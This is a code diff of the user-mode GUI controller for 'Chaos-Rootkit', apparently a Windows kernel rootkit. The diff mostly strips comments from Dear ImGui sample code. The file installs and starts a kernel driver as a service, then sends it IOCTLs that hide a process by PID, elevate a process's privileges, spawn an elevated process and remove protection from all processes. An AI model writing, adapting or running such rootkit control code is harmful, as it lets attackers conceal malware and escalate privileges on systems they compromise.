@@ -71,7 +71,7 @@ Texture	readTextureFile()
     glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR);
 
     glTexImage2D(GL_TEXTURE_2D, 0, GL_RGBA, result.width, result.height, 0, GL_RGBA, GL_UNSIGNED_BYTE, buffer);
-    
+
     stbi_image_free(buffer);
 
     return (result);
@@ -105,18 +105,15 @@ Texture	readTextureFile()
 BOOL loadDriver(char* driverPath) {
     SC_HANDLE hSCM, hService;
 
-    // Open a handle to the SCM database
     hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
     if (hSCM == NULL)
         return (1);
     const char* g_serviceName = "ZeroMemoryEx";
 
-    // Check if the service already exists
     hService = OpenServiceA(hSCM, g_serviceName, SERVICE_ALL_ACCESS);
     if (hService != NULL) {
         printf("Service already exists.\n");
 
-        // Start the service if it"s not running
         SERVICE_STATUS serviceStatus;
         if (!QueryServiceStatus(hService, &serviceStatus)) {
             CloseServiceHandle(hService);
@@ -139,7 +136,6 @@ BOOL loadDriver(char* driverPath) {
         return (0);
     }
 
-    // Create the service
     hService = CreateServiceA(hSCM, g_serviceName, g_serviceName, SERVICE_ALL_ACCESS,
         SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START,
         SERVICE_ERROR_IGNORE, driverPath, NULL, NULL, NULL,
@@ -176,13 +172,11 @@ int main(int, char**)
 
     // Decide GL+GLSL versions
 #if defined(IMGUI_IMPL_OPENGL_ES2)
-    // GL ES 2.0 + GLSL 100
     const char* glsl_version = "#version 100";
     glfwWindowHint(GLFW_CONTEXT_VERSION_MAJOR, 2);
     glfwWindowHint(GLFW_CONTEXT_VERSION_MINOR, 0);
     glfwWindowHint(GLFW_CLIENT_API, GLFW_OPENGL_ES_API);
 #elif defined(__APPLE__)
-    // GL 3.2 + GLSL 150
     const char* glsl_version = "#version 150";
     glfwWindowHint(GLFW_CONTEXT_VERSION_MAJOR, 3);
     glfwWindowHint(GLFW_CONTEXT_VERSION_MINOR, 2);
@@ -198,9 +192,9 @@ int main(int, char**)
 #endif
 
 
-  
 
-    GLFWwindow* window = glfwCreateWindow(1280, 720, "Dear ImGui GLFW+OpenGL3 ", nullptr, nullptr);
+
+    GLFWwindow* window = glfwCreateWindow(1280, 720, "Chaos-Rootkit ", nullptr, nullptr);
     if (window == nullptr)
         return 1;
     glfwMakeContextCurrent(window);
@@ -221,26 +215,9 @@ int main(int, char**)
     ImGui_ImplGlfw_InitForOpenGL(window, true);
     ImGui_ImplOpenGL3_Init(glsl_version);
 
-    // Load Fonts
-    // - If no fonts are loaded, dear imgui will use the default font. You can also load multiple fonts and use ImGui::PushFont()/PopFont() to select them.
-    // - AddFontFromFileTTF() will return the ImFont* so you can store it if you need to select the font among multiple.
-    // - If the file cannot be loaded, the function will return a nullptr. Please handle those errors in your application (e.g. use an assertion, or display an error and quit).
-    // - The fonts will be rasterized at a given size (w/ oversampling) and stored into a texture when calling ImFontAtlas::Build()/GetTexDataAsXXXX(), which ImGui_ImplXXXX_NewFrame below will call.
-    // - Use '#define IMGUI_ENABLE_FREETYPE' in your imconfig file to use Freetype for higher quality font rendering.
-    // - Read 'docs/FONTS.md' for more instructions and details.
-    // - Remember that in C/C++ if you want to include a backslash \ in a string literal you need to write a double backslash \\ !
-    // - Our Emscripten build process allows embedding fonts to be accessible at runtime from the "fonts/" folder. See Makefile.emscripten for details.
-    //io.Fonts->AddFontDefault();
-    //io.Fonts->AddFontFromFileTTF("c:\\Windows\\Fonts\\segoeui.ttf", 18.0f);
-    //io.Fonts->AddFontFromFileTTF("../../misc/fonts/DroidSans.ttf", 16.0f);
-    //io.Fonts->AddFontFromFileTTF("../../misc/fonts/Roboto-Medium.ttf", 16.0f);
-    //io.Fonts->AddFontFromFileTTF("../../misc/fonts/Cousine-Regular.ttf", 15.0f);
-    //ImFont* font = io.Fonts->AddFontFromFileTTF("c:\\Windows\\Fonts\\ArialUni.ttf", 18.0f, nullptr, io.Fonts->GetGlyphRangesJapanese());
-    //IM_ASSERT(font != nullptr);
 
-    // Our state
+                                                                
     char buf[120] = { 0 };
-
     bool show_demo_window = false;
     bool connect_to_rootkit = false;
     bool elev_specific_process = false;
@@ -257,57 +234,38 @@ int main(int, char**)
     int pid = 0;
     ImVec4 clear_color = ImVec4(0.45f, 0.55f, 0.60f, 1.00f);
 
-    // Main loop
-#ifdef __EMSCRIPTEN__
-    // For an Emscripten build we are disabling file-system access, so let's not attempt to do a fopen() of the imgui.ini file.
-    // You may manually call LoadIniSettingsFromMemory() to load settings from your own storage.
+    #ifdef __EMSCRIPTEN__
     io.IniFilename = nullptr;
     EMSCRIPTEN_MAINLOOP_BEGIN
 #else
     while (!glfwWindowShouldClose(window))
-
 #endif
     {
-
-        // - When io.WantCaptureKeyboard is true, do not dispatch keyboard input data to your main application, or clear/overwrite your copy of the keyboard data.
-        // Generally you may always pass all inputs to dear imgui, and hide them from your application based on those two flags.
         glfwPollEvents();
-
-        // Start the Dear ImGui frame
-
         float alive_rootkit[100];
         for (int n = 0; n < 100; n++)
             alive_rootkit[n] = sinf(n * 0.2f + ImGui::GetTime() * 1.5f);
        
-        //
         ImGui_ImplOpenGL3_NewFrame();
         ImGui_ImplGlfw_NewFrame();
         ImGui::NewFrame();
         Texture	tex = readTextureFile();
-        // 1. Show the big demo window (Most of the sample code is in ImGui::ShowDemoWindow()! You can browse its code to learn more about Dear ImGui!).
         if (show_demo_window)
             ImGui::ShowDemoWindow(&show_demo_window);
         {
             static float f = 0.0f;
             static int counter = 0;
+            ImGui::Begin("Rootkit Controller!"); ImVec2 windowSize = ImGui::GetWindowSize();
 
-            ImGui::Begin("Rootkit Controller!");                          // Create a window called "Hello, world!" and append into it.
-            ImVec2 windowSize = ImGui::GetWindowSize();
-
-            // Calculate the position to center the image
             float imageWidth = 180.0f;
             float imageHeight = 180.0f;
             float imageX = (windowSize.x - imageWidth) * 0.5f;
 
-            // Set the cursor position to center the image
             ImGui::SetCursorPosX(imageX);
-
-
-
-            // Display the image
             ImGui::Image((void*)(intptr_t)tex.id, ImVec2(imageWidth, imageHeight));
-            if (ImGui::Button("Connect to rootkit"))      // Edit bools storing our window open/close state
-            {   
+
+            if (ImGui::Button("Connect to rootkit")) {
+
                 WIN32_FIND_DATAA fileData;
                 HANDLE hFind;
                 char FullDriverPath[MAX_PATH];
@@ -315,16 +273,13 @@ int main(int, char**)
 
                 hFind = FindFirstFileA("ZeroMemoryEx.sys", &fileData);
 
-                if (hFind != INVALID_HANDLE_VALUE) {  // file is found
-                    if (GetFullPathNameA(fileData.cFileName, MAX_PATH, FullDriverPath, NULL) !=
-                        0) {  // full path is found
-                    }
-                    else {
+                if (hFind != INVALID_HANDLE_VALUE)
+                {
+                    if (GetFullPathNameA(fileData.cFileName, MAX_PATH, FullDriverPath, NULL) != 0) {}
+                    else
+                    {
                         is_rootket_connected = 0;
-                        
                     }
-                }
-                else {
                 }
 
                 if (loadDriver(FullDriverPath)) {
@@ -345,33 +300,30 @@ int main(int, char**)
             }
 
             ImGui::SameLine();
+
             if (is_rootket_connected)
             {
-                ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(0.0f, 1.0f, 0.0f, 1.0f)); // Set text color to green
+                ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(0.0f, 1.0f, 0.0f, 1.0f));
 
-                ImGui::Text("Rootkit Connected");               // Display some text (you can use a format strings too)
-                ImGui::PlotLines(".", alive_rootkit, 100);
+                ImGui::Text("Rootkit Connected"); ImGui::PlotLines(".", alive_rootkit, 100);
 
-                ImGui::PopStyleColor(); // Restore the default text color                
-
+                ImGui::PopStyleColor();
             }
             else
             {
-                ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(1.0f, 0.0f, 0.0f, 1.0f)); // Set text color to red
+                ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(1.0f, 0.0f, 0.0f, 1.0f));
 
-                // Display text with the changed color
+                ImGui::Text("Rootkit not Connected");
 
-                ImGui::Text("Rootkit not Connected");               // Display some text (you can use a format strings too)
-               // ImGui::PlotLines(".", dead_rootkit, 100);
-
-                ImGui::PopStyleColor(); // Restore the default text color                
-
+                ImGui::PopStyleColor();
             }
 
-            ImGui::Checkbox("Demo Window", &show_demo_window);      // Edit bools storing our window open/close state
-            ImGui::Checkbox("Hide Process", &hide_specific_process);
+            ImGui::Checkbox("Demo Window", &show_demo_window); ImGui::Checkbox("Hide Process", &hide_specific_process);
+
             ImGui::Checkbox("Spawn Elevated Process", &spawn_elevated_process);
+
             ImGui::Checkbox("Elevated Specific Process", &elev_specific_process);
+
             ImGui::Checkbox("Unprotect All Processes", &unprotect_all_processes);
 
             ImGui::Text("Application average %.3f ms/frame (%.1f FPS)", 1000.0f / io.Framerate, io.Framerate);
@@ -379,12 +331,9 @@ int main(int, char**)
             ImGui::End();
         }
 
-
-
         if (elev_specific_process)
         {
-            ImGui::Begin("Another Window", &elev_specific_process);   // Pass a pointer to our bool variable (the window will have a closing button that will clear the bool when clicked)
-            ImGui::Text("Enter PID");
+            ImGui::Begin("Another Window", &elev_specific_process);ImGui::Text("Enter PID");
 
             ImGui::SameLine();
 
@@ -393,6 +342,7 @@ int main(int, char**)
             if (ImGui::Button("Elevate Porcess"))
             {
                 pid = atoi(buf);
+
                 if (DeviceIoControl(hdevice, PRIVILEGE_ELEVATION, (LPVOID)&pid, sizeof(pid), &lpBytesReturned, sizeof(lpBytesReturned), 0, NULL))
                 {
                     component_color_handler = 2;
@@ -405,27 +355,23 @@ int main(int, char**)
 
             if (component_color_handler == 1)
             {
-                ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(1.0f, 0.0f, 0.0f, 1.0f)); // Set text color to red
+                ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(1.0f, 0.0f, 0.0f, 1.0f)); 
 
                 ImGui::Text("Faild to send IOCTL, Please make sure to provide a valid pid.");
             }
             if (component_color_handler == 2)
             {
-                ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(0.0f, 1.0f, 0.0f, 1.0f)); // Set text color to green
-                ImGui::Text("IOCTL sent, Process now is elevated");
+                ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(0.0f, 1.0f, 0.0f, 1.0f));ImGui::Text("IOCTL sent, Process now is elevated");
 
             }
 
             if (component_color_handler)
-                ImGui::PopStyleColor(); // Restore the default text color
-
+                ImGui::PopStyleColor(); 
             ImGui::End();
         }
-        // 3. Show another simple window.
         if (hide_specific_process)
         {
-            ImGui::Begin("Another Window", &hide_specific_process);   // Pass a pointer to our bool variable (the window will have a closing button that will clear the bool when clicked)
-            ImGui::Text("Enter PID");
+            ImGui::Begin("Another Window", &hide_specific_process);ImGui::Text("Enter PID");
 
             ImGui::SameLine();
 
@@ -434,6 +380,7 @@ int main(int, char**)
             if (ImGui::Button("Hide Porcess"))
             {
                 pid = atoi(buf);
+
                 if (DeviceIoControl(hdevice, HIDE_PROC, (LPVOID)&pid, sizeof(pid), &lpBytesReturned, sizeof(lpBytesReturned), 0, NULL))
                 {
                     component_color_handler = 2;
@@ -446,28 +393,27 @@ int main(int, char**)
 
             if (component_color_handler == 1)
             {
-                ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(1.0f, 0.0f, 0.0f, 1.0f)); // Set text color to red
+                ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(1.0f, 0.0f, 0.0f, 1.0f));
 
                 ImGui::Text("Faild to send IOCTL, Please make sure to provide a valid pid.");
             }
             if (component_color_handler == 2)
             {
-                ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(0.0f, 1.0f, 0.0f, 1.0f)); // Set text color to green
+                ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(0.0f, 1.0f, 0.0f, 1.0f));     
+
                 ImGui::Text("IOCTL sent, Process now is hidden");
 
             }
 
             if (component_color_handler)
-                ImGui::PopStyleColor(); // Restore the default text color
-
+                ImGui::PopStyleColor(); 
             ImGui::End();
         }
 
         if (unprotect_all_processes)
         {
 
-            ImGui::Begin("UNPROTECT_ALL_PROCESSES", &unprotect_all_processes);   // Pass a pointer to our bool variable (the window will have a closing button that will clear the bool when clicked)
-
+            ImGui::Begin("UNPROTECT_ALL_PROCESSES", &unprotect_all_processes);   
 
             if (ImGui::Button("UNPROTECT ALL PROCESSES"))
             {
@@ -484,8 +430,7 @@ int main(int, char**)
 
             if (component_color_handler == 1)
             {
-                ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(1.0f, 0.0f, 0.0f, 1.0f)); // Set text color to red
-
+                ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(1.0f, 0.0f, 0.0f, 1.0f)); 
                 ImGui::Text("Failed to send the IOCTL.");
 
 
@@ -493,23 +438,20 @@ int main(int, char**)
 
             if (component_color_handler == 2 || component_color_handler == 3)
             {
-                ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(0.0f, 1.0f, 0.0f, 1.0f)); // Set text color to green
-
+                ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(0.0f, 1.0f, 0.0f, 1.0f)); 
                 ImGui::Text("all processes protection has been removed !!");
 
             }
 
             if (component_color_handler)
-                ImGui::PopStyleColor(); // Restore the default text color                
-
+                ImGui::PopStyleColor(); 
             ImGui::End();
         }
         
         if (spawn_elevated_process)
         {
 
-            ImGui::Begin("spawA elevated_process", &spawn_elevated_process);   // Pass a pointer to our bool variable (the window will have a closing button that will clear the bool when clicked)
-
+            ImGui::Begin("spawA elevated_process", &spawn_elevated_process);   
 
             if (ImGui::Button("spawn_elevated_process"))
             {
@@ -532,14 +474,13 @@ int main(int, char**)
 
             if (component_color_handler == 1)
             {
-                ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(1.0f, 0.0f, 0.0f, 1.0f)); // Set text color to red
-
+                ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(1.0f, 0.0f, 0.0f, 1.0f)); 
                 ImGui::Text("Failed to send the IOCTL.");
 
             }
             if (component_color_handler == 2 || component_color_handler == 3)
             {
-                ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(0.0f, 1.0f, 0.0f, 1.0f)); // Set text color to green
+                ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(0.0f, 1.0f, 0.0f, 1.0f)); 
 
                 if (component_color_handler == 3)
                 {
@@ -547,24 +488,26 @@ int main(int, char**)
                     ImGui::Text("The privilege of process %d has been elevated.");
 
                 }
-                else {
+                else 
+                {
                     ImGui::Text("IOCTL %x sent!");
 
                 }
             }
 
             if (component_color_handler)
-                ImGui::PopStyleColor(); // Restore the default text color                
-
+                ImGui::PopStyleColor(); 
             ImGui::End();
         }
-        // Rendering
-        ImGui::Render();
+                ImGui::Render();
         int display_w, display_h;
         glfwGetFramebufferSize(window, &display_w, &display_h);
         glViewport(0, 0, display_w, display_h);
+
         glClearColor(clear_color.x * clear_color.w, clear_color.y * clear_color.w, clear_color.z * clear_color.w, clear_color.w);
+
         glClear(GL_COLOR_BUFFER_BIT);
+
         ImGui_ImplOpenGL3_RenderDrawData(ImGui::GetDrawData());
 
         glfwSwapBuffers(window);
@@ -573,8 +516,7 @@ int main(int, char**)
     EMSCRIPTEN_MAINLOOP_END;
 #endif
 
-    // Cleanup
-    ImGui_ImplOpenGL3_Shutdown();
+        ImGui_ImplOpenGL3_Shutdown();
     ImGui_ImplGlfw_Shutdown();
     ImGui::DestroyContext();
 
